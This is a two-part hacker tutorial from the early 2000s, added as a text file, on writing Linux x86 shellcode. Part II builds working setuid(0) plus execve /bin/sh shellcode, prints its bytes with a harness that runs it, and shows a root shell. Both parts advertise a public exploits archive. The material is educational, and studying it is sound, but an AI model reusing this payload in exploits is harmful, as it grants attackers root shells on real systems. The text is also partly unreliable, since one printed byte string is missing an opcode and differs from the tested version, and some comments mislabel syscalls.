@@ -1,0 +1,588 @@
+--------------------------------------------------------
+
+	Shellcoding.txt by bob from dtors.net		
+
+--------------------------------------------------------
+
+
+Introduction
+------------
+
+There is no real easy way out when comming to learn how to do shellcode.
+You have to no a little bit of asm, and how the stack is sorted. The
+way im going to explain differs from aleph1's method, which i learnt
+from the guys at netric.org.
+
+This paper is based on Linux x86 platforms.
+
+Some Simple asm basics
+----------------------
+
+Im going to give you some simple asm basics that you will need 
+to know to follow this paper.
+
+MOV - This puts some [data] into a register.
+      For example:
+      mov ax,10 - Puts 10 into ax.
+      mov bx,cx - Moves value from cx into bx
+      mov dx, number - Moves the value of number into dx
+
+PUSH - Pushes a piece of [data] onto the stack.
+       For example push $data
+
+POP - Puts the [data] from the stack into a 
+      specified register or variable.
+      For example pop %eax
+
+Push a push pop and save some for later:
+
+push cx - put cx on the stack
+pop  cx - puts value from the stack into cx
+
+XCHG - Exchange two registers
+
+INT - calls a bios function which are subroutines
+      that we would not write a function for. 
+      For example opening a file.
+
+      Most interupts have more than one function, this
+      means we have to pass a number to the one we want.
+
+XOR - Clears a register.
+
+LEA - Load effective address - we wont be using this.
+
+Lets get started
+----------------
+
+I have explained a little bit of asm to you, which should help you understand where 
+we go from here.
+
+For an example im going to make some shellcode which will write() a string to the screen.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+/*
+ * Linux x86 shellcode by bob from Dtors.net.
+ * write(stdout,"bob from DSR", 15); exit;
+ */
+
+
+
+#include <stdio.h>
+
+char
+shellcode[]=
+		"\x31\xc0\x31\xdb\x31\xd2\x53\x68\x20\x44\x53\x52"
+		"\x68\x66\x72\x6f\x6d\x68\x62\x6f\x62\x20\x89\xe1"
+		"\xb2\x0f\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
+
+int
+main()
+{
+        void (*funct) ();
+        (long) funct = &shellcode;
+        funct();
+}
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+Now i bet your wondering what the hell is bob on about now, well im gonna step back
+now and explain how i got this.
+
+Well first of all lets execute this and see what it does.
+
+[bob@dtors bob]$ ./bob
+bob from DSR
+[bob@dtors bob]$ 
+
+OK so its a simple write()...lets see how we done this.
+
+        xor    %eax,%eax    #clear eax
+        xor    %ebx,%ebx    #clear ebx
+        xor    %edx,%edx    #clear edx
+
+We clear the registers, because we have to 
+terminate that string with a 0.
+
+	push   %ebx         #push ebx on the stack
+
+We push ebx which contains 0 bytes onto the stack so that our shellcode
+wont execute crap after our string. For example /bin/sh[stack crap].
+
+        push   $0x52534420  #push DSR on the stack
+        push   $0x6d6f7266  #push from on the stack
+        push   $0x20626f62  #push bob on the stack
+
+Now this is where we differ from aleph1's method. Because we have the obstacle
+of finding where the string exists in memory, aleph1 used a JMP and a CALL 
+instruction. This way is alot easier, what we do is just push the strings itself 
+onto the stack, and then the $esp is the address of your string.
+
+	mov    %esp,%ecx    #mov contents of esp into ecx
+
+Here we move the contents of esp into ecx, moving our string from one register
+to the other, freeing up the esp, incase we want to push something else onto
+the stack.
+
+	mov    $0x0f,%dl    #reserve 15 bytes for arg
+
+This here will reserve 15 bytes for our string. In case you didnt notice, 
+$0x0f is hex for 15.
+
+        mov    $0x4,%al     #syscall for write
+
+Self explanitry, we get the syscall from unistd.h for write, and then declare it here.
+
+	int    $0x80        #execute the syscall
+
+The OS will no now that we want to execute the syscall.
+
+	xor    %eax,%eax    #push a 0 byte into eax
+
+Once again we are clearing eax.
+
+Now we need the exit() syscall.
+
+        mov    $0x1,%al     #syscall for exit
+        int    $0x80        #execute the syscall
+
+We give it the syscall and execute it to exit.
+
+Thats all we have to do...now we need to convert this into little endian.
+So we put it in C like so:
+
+//DSR.c
+void main(){
+__asm__("
+
+        
+        xor    %eax,%eax    #clear eax
+        xor    %ebx,%ebx    #clear ebx
+        xor    %edx,%edx    #clear edx
+        push   %ebx         #push ebx on the stack
+        push   $0x52534420  #push DSR on the stack
+        push   $0x6d6f7266  #push from on the stack
+        push   $0x20626f62  #push bob on the stack
+        mov    %esp,%ecx    #mov contents of esp into ecx
+        mov    $0x0f,%dl    #reserve 15 bytes for arg
+        mov    $0x4,%al     #syscall for write
+        int    $0x80        #execute the syscall
+        xor    %eax,%eax
+
+        // exit;
+        mov    $0x1,%al     #syscall for exit
+        int    $0x80        #execute the syscall
+");
+}
+
+Then we compile this so we can disassemble it and open up in gdb:
+
+[bob@dtors.net bob]$ gcc DSR.c -o DSR -ggdb -g
+[bob@dtors.net bob]$ gdb ./DSR
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb)  x/bx main+3
+0x804839b <main+3>:     0x31
+(gdb) 
+0x804839c <main+4>:     0xc0
+(gdb) 
+0x804839d <main+5>:     0x31
+(gdb) 
+0x804839e <main+6>:     0xdb
+(gdb) 
+0x804839f <main+7>:     0x31
+(gdb) PRESS ENTER UNTIL END
+
+Then we convert this to little endian:
+
+\x31\xc0\x31\xdb\x31 ...........and so on till you reach the end.
+
+The End.
+--------
+
+That concludes the first paper on shellcoding. My main purpose for writing this, is 
+because i always find it the best way to learn, by writing about it, for other to
+learn from. It will keep it fresh in me head ;)
+
+I would like to thank eSDee, r00tdude, and Laurens from netric.org, for helping
+me out in the past.
+
+Below you will find a few references to help you out:
+
+http://simas.wox.org/syscalls/
+http://www.newroot.de/
+http://linuxasm.org/
+http://www.netric.org/
+http://www.dtors.net/
+
+Mesgs:
+------
+Check out http://hack.dtors.net It is a NEW public exploits archive of the
+latest exploits, or unreleased. It needs your help and support though to get it
+started. It does have an upload script for you to submit your exploits. With
+your support it CAN be the LARGEST available exploits archive on the net.
+
+
+
+
+
+
+
+
+
+------------------------------------------------------------------------
+hack.dtors.net !! hack.dtors.net !!  hack.dtors.net !! hack.dtors.net !!  
+------------------------------------------------------------------------
+
+	Shellcodin Part II by bob from dtors.net
+
+
+------------------------------------------------------------------------
+hack.dtors.net !! hack.dtors.net !!  hack.dtors.net !! hack.dtors.net !!  
+------------------------------------------------------------------------
+
+
+Introduction
+------------
+
+There is no real easy way out when comming to learn how to do shellcode.
+You have to no a little bit of asm, and how the stack is sorted. The
+way im going to explain differs from aleph1's method, which i learnt
+from the guys at netric.org.
+
+This paper is based on Linux x86 platforms.
+
+Some Simple asm basics
+----------------------
+
+Im going to give you some simple asm basics that you will need 
+to know to follow this paper.
+
+MOV - This puts some [data] into a register.
+      For example:
+      mov ax,10 - Puts 10 into ax.
+      mov bx,cx - Moves value from cx into bx
+      mov dx, number - Moves the value of number into dx
+
+PUSH - Pushes a piece of [data] onto the stack.
+       For example push $data
+
+POP - Puts the [data] from the stack into a 
+      specified register or variable.
+      For example pop %eax
+
+Push a push pop and save some for later:
+
+push cx - put cx on the stack
+pop  cx - puts value from the stack into cx
+
+XCHG - Exchange two registers
+
+INT - calls a bios function which are subroutines
+      that we would not write a function for. 
+      For example opening a file.
+
+      Most interupts have more than one function, this
+      means we have to pass a number to the one we want.
+
+XOR - Clears a register.
+
+LEA - Load effective address similar to mov.
+
+SHeLLCodin...
+-------------
+
+In the last paper i explained the write() syscall, and how we went about using it.
+Well in this paper we are going to actually make some SHell code that executes a shell.
+
+So first off lets get down to our asm...
+
+        xor    %eax,%eax         #clear eax
+        push   %eax              #push eax onto the stack
+
+We clear the registers, because we have to 
+terminate that string with a 0. Then we push eax onto the stack.
+
+	        pushl $0x68732f6e        #push /sh onto the stack
+        	pushl $0x69622f2f        #push //bin onto the stack
+
+Here, we are executing //bin/sh...the reason for this is that (/bin) is 4 bytes,
+and (/sh) is 3 bytes, which will leave us with a 0 byte at the end of our string.
+
+So to clear that 0 byte at the end, we use (//bi) - 4 bytes, (n/sh) - the remainder
+4 bytes. We could use another shell such as /bin/ash...which would clear the 0byte 
+also.
+
+	mov    %esp,%ebx    #mov contents of esp into ebx
+
+Here we move the contents of esp into ebx, moving our string from one register
+to the other, freeing up the esp, incase we want to push something else onto
+the stack.
+
+	lea    0x8(%esp,1),%edx  #loads effective address
+
+This is similar to MOV, except this "loads the effective address".
+
+   
+	push   %eax              #push eax onto the stack
+        push   %ebx              #push ebx onto the stack
+	lea    (%esp,1),%ecx     #load effective address
+
+Self explanitry..
+
+     mov    $0xb,%al     #syscall for write
+
+Self explanitry, we get the syscall from unistd.h for execve(), and then declare it here.
+
+	int    $0x80        #execute the syscall
+
+The OS will no now that we want to execute the syscall.
+
+Lets see if this works:
+
+//x86_sh.c
+void main(){
+__asm__("
+
+        
+        xor    %eax,%eax         
+        push   %eax              
+        pushl $0x68732f6e        
+        pushl $0x69622f2f        
+        mov    %esp,%ebx         
+        lea    0x8(%esp,1),%edx  
+        push   %eax              
+        push   %ebx              
+        lea    (%esp,1),%ecx     
+        mov    $0xb,%al          
+        int    $0x80             
+
+");
+}
+
+
+[bob@dtors.net bob]$ gcc x86_sh.c -o x86_sh 
+[bob@dtors.net bob]$ ./x86_sh
+$ exit
+[bob@dtors.net bob]$
+
+There it worked! All in 29 bytes! Not bad...but unsafe..if the execve() was to fail,
+it would crash a horrible death, so we need to add an exit() call in there.
+
+// exit();
+        xor    %eax,%eax         #clear eax register
+        mov    $0x1,%al          #syscall for exit
+        int    $0x80             #execute syscall
+
+And we add that to the end of our original code...like:
+
+
+//x86_sh.c
+void main(){
+__asm__("
+
+        
+        xor    %eax,%eax         
+        push   %eax              
+        pushl $0x68732f6e        
+        pushl $0x69622f2f        
+        mov    %esp,%ebx         
+        lea    0x8(%esp,1),%edx  
+        push   %eax              
+        push   %ebx              
+        lea    (%esp,1),%ecx     
+        mov    $0xb,%al          
+        int    $0x80
+        xor    %eax,%eax         #clear eax register
+        mov    $0x1,%al          #syscall for exit
+        int    $0x80             #execute syscall           
+
+");
+}
+
+[bob@dtors.net bob]$ gcc x86_sh.c -o x86_sh 
+[bob@dtors.net bob]$ ./x86_sh
+$ exit
+[bob@dtors.net bob]$ 
+
+Still works, but this time it is slightly larger, but at least its not gonna sigsegv on us.
+
+Ok we have got this far but we are missing one little bit....If we use this shellcode in
+an exploit we will get a shell, but it wont be the effective uid/gid. So we need to add
+a little bit more to setuid(). So lets check out what the syscall is for setuid.
+
+[bob@dtors bob]$ cat /usr/src/linux-2.2.14/include/asm-i386/unistd.h | grep setuid
+#define __NR_setuid              23
+[bob@dtors bob]$ 
+
+Then we take 23 and convert it to hex which gives us: 17.
+
+Which then converted to asm gives us:
+
+	xor    %eax,%eax
+        xor    %ebx,%ebx
+        xor    %ecx,%ecx
+        mov    $0x17,%al
+        int    $0x80
+
+We clear eax, ebx and ecx....the reason for this is the syscall #  goes into eax, 
+then ebx and ecx are arg1 and arg 2. So what we are actually doing is setuid(0,0).
+Then the hex syscall# for setuid, then we execute it.
+
+So our revised code now is:
+
+
+//x86_sh.c
+void main(){
+__asm__("
+
+        xor    %eax,%eax #setuid()
+        xor    %ebx,%ebx
+        xor    %ecx,%ecx
+        mov    $0x17,%al
+        int    $0x80
+
+        xor    %eax,%eax  #execve()
+        push   %eax              
+        pushl $0x68732f6e        
+        pushl $0x69622f2f        
+        mov    %esp,%ebx         
+        lea    0x8(%esp,1),%edx  
+        push   %eax              
+        push   %ebx              
+        lea    (%esp,1),%ecx     
+        mov    $0xb,%al          
+        int    $0x80
+
+        xor    %eax,%eax         #exit()
+        mov    $0x1,%al          
+        int    $0x80                       
+
+");
+}
+
+That should just about do us. We setuid 0,0, then we execute //bin/sh, and finally, exit();
+
+Now lets compile this and test it out:
+
+[bob@dtors bob]$ su
+Password: 
+[root@dtors bob]# chown root.root ./x86_sh
+[root@dtors bob]# chmod 4775 ./x86_sh
+[root@dtors bob]# ls -al ./x86_sh
+-rwsrwxr-x    1 root     root        12014 Sep  6 08:54 ./x86_sh
+[root@dtors bob]# exit
+exit
+[bob@dtors bob]$ ./x86_sh
+sh-2.05# id -a
+uid=0(root) gid=501(bob) groups=501(bob)
+sh-2.05# exit
+[bob@dtors.net bob]$ 
+
+There we go..we set ./x86_sh suid, and owned by root, to see if it
+would setuid(), then execute /bin/sh. As you can see it worked..
+
+..so now to convert into little endian:
+
+[bob@dtors.net bob]$ gcc x86_sh.c -o x86_sh -ggdb -g
+[bob@dtors.net bob]$ gdb x86_sh
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) x/bx main+3
+0x804839b <main+3>:     0x31
+(gdb) 
+0x804839c <main+4>:     0xc0
+(gdb) 
+0x804839d <main+5>:     0x31
+(gdb) 
+0x804839e <main+6>:     0xdb
+(gdb) 
+0x804839f <main+7>:     0x31
+(gdb) 
+0x80483a0 <main+8>:     0xc9
+(gdb) 
+(gdb) PRESS ENTER UNTIL END
+
+Then we convert this to little endian:
+
+\x31\xc0\x31\xdb\x31 ...........and so on till you reach the end.
+
+Which eventually results to:
+
+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80"
+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x2f\x2f"
+"\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53"
+"\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0"
+"\x01\xcd\x80";
+
+Now to test we copied it out write we can execute this by making a program to do so:
+
+
+#include <stdio.h>
+
+char shellcode[]=
+		"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80"
+		"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f"
+		"\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50"
+		"\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0"
+		"\xb0\x01\xcd\x80";
+int
+main()
+{
+        void (*dsr) ();
+        (long) dsr = &shellcode;
+        printf("Size: %d bytes.\n", sizeof(shellcode)); 
+        dsr();
+}
+
+[bob@dtors.net bob]$ gcc test.c -o test
+[bob@dtors.net bob]$ ./test
+$ exit
+[bob@dtors.net bob]$
+
+Wollah! badaBING!
+
+
+The End.
+--------
+
+That concludes the second paper on shellcoding. My main purpose for writing this, is 
+because i always find it the best way to learn, by writing about it.
+
+Thanks goes to eSDee, r00tdude, and Laurens from netric.org, for helping
+me out.
+
+Below you will find a few references to help you out:
+
+http://simas.wox.org/syscalls/
+http://www.newroot.de/
+http://linuxasm.org/
+http://www.netric.org/
+http://www.dtors.net/
+http://www.nopninjas.org
+
+Mesgs:
+
+Check out http://hack.dtors.net It is a NEW public exploits archive of the
+latest exploits, or unreleased. It needs your help and support though to get it
+started. It does have an upload script for you to submit your exploits. With
+your support it CAN be the LARGEST available exploits archive on the net.
+
+
+------------------------------------------------------------------------
+hack.dtors.net !! hack.dtors.net !!  hack.dtors.net !! hack.dtors.net !!  
+------------------------------------------------------------------------
+
+
+
